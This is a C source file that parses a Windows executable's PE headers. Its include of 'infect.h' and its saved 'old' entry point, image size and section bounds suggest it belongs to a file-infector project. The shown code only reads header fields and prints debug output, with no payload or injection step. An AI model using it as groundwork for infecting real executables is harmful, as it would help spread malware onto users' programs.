#include <stdio.h>
#include <string.h>

#include "type.h"
#include "pe.h"
#include "infect.h"

u32 NT_header_off;

u16 number_of_sections_old;
u32 size_of_image_old;
u32 address_of_entry_point_old;

u16 size_of_optional_header;

u32 section_tables_start;
u32 section_tables_end_old;
u32 sections_start;
u32 sections_end_old;

void parse(){
    // TODO tell if the file is a pe file
#ifndef NDEBUG
    puts("\tstart\n");
#endif
    NT_header_off = *(u32*)(file + DOS_HEADER__NT_HEADER_OFF);
    u32 file_header_off = NT_header_off + NT_HEADER__FILE_HEADER_OFF;
    u32 optional_header_off = NT_header_off + NT_HEADER__OPTIONAL_HEADER_OFF;

    printf("\tstart parse NT header\n");
    number_of_sections_old = *(u16*)(file + file_header_off + FILE_HEADER__NUMBER_OF_SECTION_OFF);
    size_of_optional_header = *(u16*)(file + file_header_off + FILE_HEADER__SIZE_OF_OPTIONAL_HEADER); 
    size_of_image_old = *(u32*)(file + optional_header_off + OPTIONAL_HEADER__SIZE_OF_IMAGE_OFF);
    address_of_entry_point_old = *(u32*)(file + optional_header_off +OPTIONAL_HEADER__ADDRESS_OF_ENTRY_POINT_OFF);

    // section headers:
    printf("\tstart parse section headers\n");
    section_tables_start = optional_header_off + size_of_optional_header;
    section_tables_end_old = section_tables_start + (number_of_sections_old * SECTION_HEADER_SIZE);
    INFO("%x\n", section_tables_end_old);

    printf("\tsections\n");
    struct SectionHeader header;
    memcpy(&header, file + section_tables_start, SECTION_HEADER_SIZE);
    InfoSectionHeader(header);
    sections_start = header.PointerToRawData;
    memcpy(&header, file + section_tables_start + (number_of_sections_old - 1) * SECTION_HEADER_SIZE, SECTION_HEADER_SIZE);
    InfoSectionHeader(header);
    sections_end_old = header.PointerToRawData + header.SizeOfRawData;
#ifndef NDEBUG
    puts("\tfinish\n");
#endif
}